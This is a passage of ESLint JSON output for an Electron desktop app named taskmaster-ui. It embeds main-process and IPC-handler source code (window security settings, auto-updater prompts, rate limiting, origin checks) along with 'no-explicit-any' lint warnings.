console.log(`${_WARNING_PREFIX} Main/Preload file changed: ${filePath}`);\n      console.log('ðŸ”¥ electron-vite will handle the restart automatically');\n    });\n    \n    mainWatcher.on('error', (error: Error) => {\n      errorLog('HOT_RELOAD_WATCH', 'File watcher error', error);\n    });\n    \n    // Log renderer changes (handled by Vite HMR)\n    console.log(`${INFO_PREFIX} Hot reload monitoring active:`);\n    console.log('  ðŸ”¥ Main process: Watched by electron-vite (auto-restart)');\n    console.log('  ðŸ”¥ Preload scripts: Watched by electron-vite (auto-restart)');\n    console.log('  ðŸ”¥ Renderer process: Handled by Vite HMR (hot updates)');\n  };\n  \n  // Initialize hot reload monitoring\n  try {\n    setupHotReloadMonitoring();\n  } catch (error) {\n    errorLog('HOT_RELOAD_INIT', 'Failed to initialize hot reload monitoring', error);\n  }\n}\n\n// Log when the app starts\nconsole.log(`\\n${SUCCESS_PREFIX} Main process initialized`);\nconsole.log(`ðŸ“ Script location: ${__filename}`);\nconsole.log(`ðŸ“ Working directory: ${process.cwd()}`);\ntimingLog('Main process startup complete');\n\n// Note: electron-squirrel-startup removed during migration to electron-vite\n// Squirrel startup handling will be configured in electron-builder if needed\n\n// Security: Disable GPU acceleration if needed for security (uncomment if required)\n// app.disableHardwareAcceleration();\n\n// Security: Enable secure protocols\napp.setAsDefaultProtocolClient('taskmaster');\n\n// Auto-updater configuration for 2025 best practices\nclass AutoUpdaterManager {\n  private static instance: AutoUpdaterManager;\n  private mainWindow: BrowserWindow | null = null;\n\n  private constructor() {\n    this.configureAutoUpdater();\n  }\n\n  public static getInstance(): AutoUpdaterManager {\n    if (!AutoUpdaterManager.instance) {\n      AutoUpdaterManager.instance = new AutoUpdaterManager();\n    }\n    return AutoUpdaterManager.instance;\n  }\n\n  public setMainWindow(window: BrowserWindow): void {\n    this.mainWindow = window;\n  }\n\n  private configureAutoUpdater(): void {\n    // Security: Enable signature verification (macOS and Windows)\n    autoUpdater.autoDownload = false;\n    autoUpdater.autoInstallOnAppQuit = true;\n\n    // Auto-updater event handlers\n    autoUpdater.on('checking-for-update', () => {\n      console.log('Checking for update...');\n    });\n\n    autoUpdater.on('update-available', (info) => {\n      console.log('Update available:', info);\n      this.promptUserForUpdate(info);\n    });\n\n    autoUpdater.on('update-not-available', (info) => {\n      console.log('Update not available:', info);\n    });\n\n    autoUpdater.on('error', (err) => {\n      console.error('Auto-updater error:', err);\n    });\n\n    autoUpdater.on('download-progress', (progressObj) => {\n      const logMessage = `Download speed: ${progressObj.bytesPerSecond} - Downloaded ${progressObj.percent}% (${progressObj.transferred}/${progressObj.total})`;\n      console.log(logMessage);\n      this.mainWindow?.webContents.send('download-progress', progressObj);\n    });\n\n    autoUpdater.on('update-downloaded', (info) => {\n      console.log('Update downloaded:', info);\n      this.promptUserToInstall();\n    });\n  }\n\n  private async promptUserForUpdate(info: { version: string }): Promise<void> {\n    if (!this.mainWindow) return;\n\n    const result = await dialog.showMessageBox(this.mainWindow, {\n      type: 'info',\n      title: 'Update Available',\n      message: 'A new version is available. Would you like to download it now?',\n      detail: `Version ${info.version} is available. The app will restart after the update.`,\n      buttons: ['Download', 'Later'],\n      defaultId: 0,\n      cancelId: 1\n    });\n\n    if (result.response === 0) {\n      autoUpdater.downloadUpdate();\n    }\n  }\n\n  private async promptUserToInstall(): Promise<void> {\n    if (!this.mainWindow) return;\n\n    const result = await dialog.showMessageBox(this.mainWindow, {\n      type: 'info',\n      title: 'Update Ready',\n      message: 'Update downloaded. Restart the application to apply the update.',\n      buttons: ['Restart Now', 'Later'],\n      defaultId: 0,\n      cancelId: 1\n    });\n\n    if (result.response === 0) {\n      autoUpdater.quitAndInstall();\n    }\n  }\n\n  public checkForUpdates(): void {\n    // Only check for updates in production\n    if (app.isPackaged) {\n      autoUpdater.checkForUpdatesAndNotify();\n    }\n  }\n}\n\nconst createWindow = (): void => {\n  timingLog('Starting createWindow()');\n  debugLog('WINDOW_CREATION', 'Creating main browser window...');\n  \n  try {\n    // electron-vite automatically handles preload script paths\n    const preloadPath = path.join(__dirname, '../preload/index.cjs');\n    checkFileExists(preloadPath, 'Preload Script');\n    \n    // Create the browser window with 2025 security best practices\n    const windowConfig = {\n      height: 800,\n      width: 1200,\n      minHeight: 600,\n      minWidth: 800,\n      webPreferences: {\n        // 2025 Security Best Practices - Critical Settings\n        nodeIntegration: false,              // Disable Node.js in renderer process\n        contextIsolation: true,              // Enable context isolation (default since Electron 12)\n        enableRemoteModule: false,           // Disable remote module (deprecated but ensure it's off)\n        allowRunningInsecureContent: false,  // Block mixed content\n        experimentalFeatures: false,         // Disable experimental web features\n        \n        // Security: Preload script for safe API exposure\n        preload: preloadPath,\n        \n        // Security: Sandbox the renderer process\n        sandbox: false, // Set to true for maximum security, false for now to maintain functionality\n        \n        // Security: Disable webSecurity only in development\n        webSecurity: !process.env.ELECTRON_DISABLE_SECURITY_WARNINGS,\n        \n        // Security: Additional protections\n        spellcheck: false,                   // Disable spellcheck to prevent data leakage\n        defaultEncoding: 'UTF-8',\n      },\n      \n      // Window appearance and behavior\n      show: false, // Don't show until ready\n      titleBarStyle: (process.platform === 'darwin' ? 'hiddenInset' : 'default') as 'hiddenInset' | 'default',\n      \n      // Security: Icon configuration - Updated for electron-vite asset structure\n      icon: path.join(__dirname, '../../resources/icon-256.png'),\n    };\n    \n    debugLog('WINDOW_CONFIG', 'Window configuration', windowConfig);\n    \n    const mainWindow = new BrowserWindow(windowConfig);\n    \n    console.log(`${SUCCESS_PREFIX} Main window created successfully`);\n    debugLog('WINDOW_CREATED', 'BrowserWindow instance created', {\n      id: mainWindow.id,\n      webContentsId: mainWindow.webContents.id,\n    });\n\n  // Security: Configure window behavior\n  mainWindow.setMenuBarVisibility(false); // Hide menu bar (can be toggled with Alt)\n  \n  // Security: Handle external navigation attempts\n  mainWindow.webContents.setWindowOpenHandler(({ url }) => {\n    // Security: Block all window.open attempts and open in external browser\n    shell.openExternal(url);\n    return { action: 'deny' };\n  });\n\n  // Security: Prevent navigation to external URLs\n  mainWindow.webContents.on('will-navigate', (event, navigationUrl) => {\n    const parsedUrl = new URL(navigationUrl);\n    \n    // Allow navigation within the app (dev server or file protocol)\n    if (!parsedUrl.origin.startsWith('http://localhost') && parsedUrl.origin !== 'file://') {\n      event.preventDefault();\n      shell.openExternal(navigationUrl);\n    }\n  });\n\n  // Security: Handle new window requests (replaced deprecated 'new-window' event)\n  mainWindow.webContents.setWindowOpenHandler(({ url }) => {\n    shell.openExternal(url);\n    return { action: 'deny' };\n  });\n\n  // Load the app - electron-vite handles development/production URLs automatically\n  debugLog('URL_LOADING', 'Loading application...');\n  \n  if (!app.isPackaged) {\n    // Development mode: electron-vite provides dev server URL automatically\n    console.log(`${INFO_PREFIX} Loading development server (electron-vite handles URL)`);\n    debugLog('DEV_MODE', 'Loading development URL');\n    \n    // electron-vite dev server runs on standard port 5173\n    const devServerUrl = process.env.VITE_DEV_SERVER_URL || 'http://localhost:5173';\n    mainWindow.loadURL(devServerUrl).then(() => {\n      console.log(`${SUCCESS_PREFIX} Successfully loaded dev server`);\n      timingLog('Dev server loaded');\n    }).catch((err) => {\n      errorLog('DEV_LOAD_ERROR', 'Failed to load dev server', err);\n      dialog.showErrorBox('Development Server Error', \n        `Failed to connect to development server\\n\\nError: ${err.message}\\n\\nMake sure electron-vite dev server is running.`);\n    });\n  } else {\n    // Production mode: electron-vite builds to standard location\n    const indexPath = path.join(__dirname, '../renderer/index.html');\n    \n    console.log(`${INFO_PREFIX} Loading from file system (production mode)`);\n    debugLog('PROD_MODE', 'Loading production file', { \n      indexPath,\n      exists: fs.existsSync(indexPath)\n    });\n    \n    mainWindow.loadFile(indexPath).then(() => {\n      console.log(`${SUCCESS_PREFIX} Successfully loaded production build`);\n      timingLog('Production file loaded');\n    }).catch((err) => {\n      errorLog('PROD_LOAD_ERROR', 'Failed to load production build', err);\n      dialog.showErrorBox('Loading Error', \n        `Failed to load application file\\n\\nError: ${err.message}`);\n    });\n  }\n\n  // Security: Production CSP headers will be set by Vite\n  if (!app.isPackaged) {\n    // Development: Open DevTools\n    mainWindow.webContents.openDevTools();\n    console.log(`${INFO_PREFIX} DevTools opened (development mode)`);\n    \n    // Add console message handler to see renderer logs in main process\n    mainWindow.webContents.on('console-message', (_event, level, message, line, sourceId) => {\n      const logPrefix = `ðŸŒ [RENDERER ${level}]`;\n      console.log(`${logPrefix} ${message} (${sourceId}:${line})`);\n    });\n  }\n\n  // Enhanced error tracking for renderer process\n  mainWindow.webContents.on('did-fail-load', (event, errorCode, errorDescription, validatedURL) => {\n    errorLog('RENDERER_LOAD_FAIL', 'Renderer failed to load', {\n      errorCode,\n      errorDescription,\n      validatedURL,\n      event\n    });\n  });\n\n  mainWindow.webContents.on('render-process-gone', (_event, details) => {\n    errorLog('RENDERER_CRASH', 'Renderer process gone', { details, reason: details.reason, exitCode: details.exitCode });\n  });\n\n  // Log successful page loads\n  mainWindow.webContents.on('did-finish-load', () => {\n    console.log(`${SUCCESS_PREFIX} Renderer finished loading`);\n    timingLog('Renderer fully loaded');\n    \n    // Log some debug info about the loaded page\n    mainWindow.webContents.executeJavaScript(`\n      console.log('ðŸŽ¯ Page loaded successfully');\n      console.log('ðŸ“ Location:', window.location.href);\n      console.log('ðŸ”Œ electronAPI available:', typeof window.electronAPI !== 'undefined');\n      if (typeof window.electronAPI !== 'undefined') {\n        console.log('ðŸ“‹ electronAPI methods:', Object.keys(window.electronAPI));\n      } else {\n        console.error('âŒ electronAPI is NOT available in renderer!');\n      }\n    `);\n  });\n\n  mainWindow.webContents.on('did-start-loading', () => {\n    debugLog('RENDERER_LOADING', 'Renderer started loading');\n  });\n\n  mainWindow.webContents.on('dom-ready', () => {\n    debugLog('RENDERER_DOM', 'Renderer DOM ready');\n  });\n\n  // Show window when ready\n  mainWindow.once('ready-to-show', () => {\n    console.log(`${SUCCESS_PREFIX} Window ready to show`);\n    timingLog('Window ready to show');\n    mainWindow.show();\n    \n    // Initialize development shortcuts for hot reloading\n    if (!app.isPackaged && (global as any).addDevelopmentShortcuts) {\n      (global as any).addDevelopmentShortcuts(mainWindow);\n      debugLog('DEV_SHORTCUTS', 'Development shortcuts initialized for hot reloading');\n    }\n    \n    // Initialize auto-updater\n    const autoUpdaterManager = AutoUpdaterManager.getInstance();\n    autoUpdaterManager.setMainWindow(mainWindow);\n    \n    // Check for updates after a delay to ensure app is fully loaded\n    setTimeout(() => {\n      debugLog('AUTO_UPDATE', 'Checking for updates...');\n      autoUpdaterManager.checkForUpdates();\n    }, 3000);\n  });\n\n  // Security: Clear cache on window close in development\n  mainWindow.on('closed', () => {\n    debugLog('WINDOW_EVENT', 'Window closed');\n    if (!app.isPackaged) {\n      mainWindow.webContents.session.clearCache();\n      debugLog('CACHE', 'Cleared session cache (dev mode)');\n    }\n  });\n  \n  } catch (error) {\n    errorLog('WINDOW_CREATION_FATAL', 'Fatal error creating window', error);\n    dialog.showErrorBox('Fatal Error', \n      `Failed to create application window.\\n\\nError: ${error}\\n\\nThe application will now exit.`);\n    app.quit();\n  }\n};\n\n// Security: IPC handlers with input validation\nipcMain.handle('app:get-version', () => {\n  return app.getVersion();\n});\n\nipcMain.handle('app:get-platform', () => {\n  return process.platform;\n});\n\nipcMain.handle('app:get-app-data-path', () => {\n  return app.getPath('userData');\n});\n\n// Security: Sanitize and validate file system operations\nipcMain.handle('fs:get-documents-path', () => {\n  return app.getPath('documents');\n});\n\n// Security: Safe dialog operations\nipcMain.handle('dialog:show-error', async (event, title: string, content: string) => {\n  const window = BrowserWindow.fromWebContents(event.sender);\n  if (!window) return;\n  \n  return await dialog.showErrorBox(title, content);\n});\n\n// App event handlers\napp.on('window-all-closed', () => {\n  debugLog('APP_EVENT', 'All windows closed');\n  // Security: Clear sensitive data on app close\n  if (process.platform !== 'darwin') {\n    debugLog('APP_EVENT', 'Quitting app (non-macOS)');\n    app.quit();\n  }\n});\n\napp.on('activate', () => {\n  debugLog('APP_EVENT', 'App activated');\n  if (BrowserWindow.getAllWindows().length === 0) {\n    debugLog('APP_EVENT', 'No windows exist, creating new window');\n    createWindow();\n  }\n});\n\n// Log app readiness\napp.on('will-finish-launching', () => {\n  debugLog('APP_EVENT', 'App will finish launching');\n});\n\napp.on('before-quit', (event) => {\n  debugLog('APP_EVENT', 'App before quit', { event });\n});\n\napp.on('will-quit', (event) => {\n  debugLog('APP_EVENT', 'App will quit', { event });\n});\n\napp.on('quit', (event, exitCode) => {\n  debugLog('APP_EVENT', 'App quit', { event, exitCode });\n});\n\n// Security: App startup\napp.whenReady().then(() => {\n  console.log(`${SUCCESS_PREFIX} Electron app is ready!`);\n  timingLog('App ready event fired');\n  debugLog('APP_READY', 'App is ready, creating window...');\n  // Security: Set app security policies\n  // Security: Set app security policies (Windows only)\n  if (process.platform === 'win32') {\n    app.setUserTasks([]); // Clear any user tasks\n  }\n  \n  createWindow();\n  \n  // Security: Handle certificate errors\n  app.on('certificate-error', (event, _webContents, url, _error, _certificate, callback) => {\n    // In production, reject all certificate errors\n    // In development, you might want to allow localhost\n    if (!app.isPackaged && url.startsWith('http://localhost')) {\n      event.preventDefault();\n      callback(true);\n    } else {\n      callback(false);\n    }\n  });\n});\n\n// Security: Protocol handler registration\napp.setAsDefaultProtocolClient('taskmaster');\n\n// Security: Handle protocol activation (Windows/Linux)\napp.on('second-instance', () => {\n  // Someone tried to run a second instance, focus our window instead\n  const windows = BrowserWindow.getAllWindows();\n  if (windows.length > 0 && windows[0]) {\n    if (windows[0].isMinimized()) windows[0].restore();\n    windows[0].focus();\n  }\n});\n\n// Ensure single instance (temporarily disabled for debugging)\n// const gotTheLock = app.requestSingleInstanceLock();\n// if (!gotTheLock) {\n//   app.quit();\n// }\n\n// Export for testing purposes\nexport { createWindow };","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/ipc-handlers.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":12,"column":49,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":12,"endColumn":52,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[322,325],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[322,325],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":12,"column":67,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":12,"endColumn":70,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[340,343],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[340,343],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":12,"column":74,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":12,"endColumn":77,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[347,350],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[347,350],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":42,"column":51,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":42,"endColumn":54,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1098,1101],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1098,1101],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":42,"column":69,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":42,"endColumn":72,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1116,1119],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1116,1119],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":42,"column":76,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":42,"endColumn":79,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1123,1126],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1123,1126],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":92,"column":59,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":92,"endColumn":62,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2298,2301],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2298,2301],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":92,"column":77,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":92,"endColumn":80,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2316,2319],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2316,2319],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":92,"column":84,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":92,"endColumn":87,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2323,2326],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2323,2326],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":95,"column":55,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":95,"endColumn":58,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2419,2422],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2419,2422],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":95,"column":71,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":95,"endColumn":74,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2435,2438],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2435,2438],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":180,"column":32,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":180,"endColumn":35,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4921,4924],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4921,4924],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":222,"column":49,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":222,"endColumn":52,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6049,6052],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6049,6052],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":222,"column":67,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":222,"endColumn":70,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6067,6070],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6067,6070],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":222,"column":74,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":222,"endColumn":77,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6074,6077],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6074,6077],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":15,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * IPC Handlers for Electron Main Process\n * \n * This module provides centralized IPC handler management including\n * setup, cleanup, and security validation.\n */\n\nimport { ipcMain, IpcMainInvokeEvent } from 'electron';\n\nexport interface IPCHandler {\n  channel: string;\n  handler: (event: IpcMainInvokeEvent, ...args: any[]) => Promise<any> | any;\n  isSetup: boolean;\n  setupTime?: number;\n}\n\nexport interface IPCHandlerOptions {\n  validateOrigin?: boolean;\n  requireSecureContext?: boolean;\n  rateLimit?: {\n    maxRequests: number;\n    windowMs: number;\n  };\n}\n\nclass IPCHandlerManager {\n  private static instance: IPCHandlerManager;\n  private handlers = new Map<string, IPCHandler>();\n  private rateLimitStore = new Map<string, { count: number; resetTime: number }>();\n\n  private constructor() {}\n\n  public static getInstance(): IPCHandlerManager {\n    if (!IPCHandlerManager.instance) {\n      IPCHandlerManager.instance = new IPCHandlerManager();\n    }\n    return IPCHandlerManager.instance;\n  }\n\n  public setupHandler(\n    channel: string,\n    handler: (event: IpcMainInvokeEvent, ...args: any[]) => Promise<any> | any,\n    options: IPCHandlerOptions = {}\n  ): void {\n    if (this.handlers.has(channel)) {\n      console.warn(`IPC handler for channel '${channel}' is already setup`);\n      return;\n    }\n\n    const wrappedHandler = this.wrapHandler(handler, options);\n    \n    ipcMain.handle(channel, wrappedHandler);\n    \n    this.handlers.set(channel, {\n      channel,\n      handler: wrappedHandler,\n      isSetup: true,\n      setupTime: Date.now(),\n    });\n  }\n\n  public removeHandler(channel: string): boolean {\n    const handler = this.handlers.get(channel);\n    if (!handler) {\n      return false;\n    }\n\n    ipcMain.removeHandler(channel);\n    this.handlers.delete(channel);\n    return true;\n  }\n\n  public getHandler(channel: string): IPCHandler | undefined {\n    return this.handlers.get(channel);\n  }\n\n  public getAllHandlers(): IPCHandler[] {\n    return Array.from(this.handlers.values());\n  }\n\n  public getHandlerCount(): number {\n    return this.handlers.size;\n  }\n\n  public clearAllHandlers(): void {\n    for (const channel of this.handlers.keys()) {\n      this.removeHandler(channel);\n    }\n  }\n\n  private wrapHandler(\n    originalHandler: (event: IpcMainInvokeEvent, ...args: any[]) => Promise<any> | any,\n    options: IPCHandlerOptions\n  ) {\n    return async (event: IpcMainInvokeEvent, ...args: any[]): Promise<any> => {\n      try {\n        // Rate limiting\n        if (options.rateLimit) {\n          const isAllowed = this.checkRateLimit(event.sender.id.toString(), options.rateLimit);\n          if (!isAllowed) {\n            throw new Error('Rate limit exceeded');\n          }\n        }\n\n        // Origin validation\n        if (options.validateOrigin) {\n          const isValidOrigin = this.validateOrigin(event);\n          if (!isValidOrigin) {\n            throw new Error('Invalid origin');\n          }\n        }\n\n        // Secure context validation\n        if (options.requireSecureContext) {\n          const isSecure = this.validateSecureContext(event);\n          if (!isSecure) {\n            throw new Error('Secure context required');\n          }\n        }\n\n        return await originalHandler(event, ...args);\n      } catch (error) {\n        console.error('IPC handler error:', error);\n        throw error;\n      }\n    };\n  }\n\n  private checkRateLimit(\n    clientId: string,\n    rateLimit: { maxRequests: number; windowMs: number }\n  ): boolean {\n    const now = Date.now();\n    const clientData = this.rateLimitStore.get(clientId);\n\n    if (!clientData || now > clientData.resetTime) {\n      this.rateLimitStore.set(clientId, {\n        count: 1,\n        resetTime: now + rateLimit.windowMs,\n      });\n      return true;\n    }\n\n    if (clientData.count >= rateLimit.maxRequests) {\n      return false;\n    }\n\n    clientData.count++;\n    return true;\n  }\n\n  private validateOrigin(event: IpcMainInvokeEvent): boolean {\n    // In a real application, you would validate against allowed origins\n    // For now, we'll allow all origins from the same protocol\n    const senderFrame = event.senderFrame;\n    return senderFrame.url.startsWith('file://') || senderFrame.url.startsWith('http://localhost');\n  }\n\n  private validateSecureContext(event: IpcMainInvokeEvent): boolean {\n    // Check if the sender is in a secure context\n    const senderFrame = event.senderFrame;\n    return senderFrame.url.startsWith('https://') || senderFrame.url.startsWith('file://');\n  }\n}\n\n// Default handlers\nconst defaultHandlers = {\n  'app:get-version': async () => {\n    const { app } = await import('electron');\n    return app.getVersion();\n  },\n  \n  'app:get-name': async () => {\n    const { app } = await import('electron');\n    return app.getName();\n  },\n\n  'app:get-path': async (event: IpcMainInvokeEvent, name: string) => {\n    const { app } = await import('electron');\n    return app.getPath(name as any);\n  },\n\n  'window:minimize': async (event: IpcMainInvokeEvent) => {\n    const window = event.sender.getOwnerBrowserWindow();\n    window?.minimize();\n  },\n\n  'window:maximize': async (event: IpcMainInvokeEvent) => {\n    const window = event.sender.getOwnerBrowserWindow();\n    if (window?.isMaximized()) {\n      window.unmaximize();\n    } else {\n      window?.maximize();\n    }\n  },\n\n  'window:close': async (event: IpcMainInvokeEvent) => {\n    const window = event.sender.getOwnerBrowserWindow();\n    window?.close();\n  },\n};\n\n// Export singleton instance functions\nconst handlerManager = IPCHandlerManager.getInstance();\n\nexport function setupIpcHandlers(): void {\n  // Setup default handlers\n  for (const [channel, handler] of Object.entries(defaultHandlers)) {\n    handlerManager.setupHandler(channel, handler, {\n      validateOrigin: true,\n      rateLimit: { maxRequests: 100, windowMs: 60000 }, // 100 requests per minute\n    });\n  }\n}\n\nexport function cleanupIpcHandlers(): void {\n  handlerManager.clearAllHandlers();\n}\n\nexport function setupHandler(\n  channel: string,\n  handler: (event: IpcMainInvokeEvent, ...args: any[]) => Promise<any> | any,\n  options?: IPCHandlerOptions\n): void {\n  handlerManager.setupHandler(channel, handler, options);\n}\n\nexport function removeHandler(channel: string): boolean {\n  return handlerManager.removeHandler(channel);\n}\n\nexport function getHandler(channel: string): IPCHandler | undefined {\n  return handlerManager.getHandler(channel);\n}\n\nexport function getAllHandlers(): IPCHandler[] {\n  return handlerManager.getAllHandlers();\n}\n\nexport function getHandlerCount(): number {\n  return handlerManager.getHandlerCount();\n}\n\nexport { IPCHandlerManager };\nexport default handlerManager;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/security/ipc-rate-limiter.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/main/security/secure-ipc-handler.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":16,"column":22,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":16,"endColumn":25,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[481,484],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[481,484],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":17,"column":22,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":17,"endColumn":25,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[518,521],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[518,521],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":17,"column":30,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":17,"endColumn":33,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[526,529],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[526,529],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-unsafe-function-type","severity":2,"message":"The `Function` type accepts any function-like value.\nPrefer explicitly defining any function parameters and return 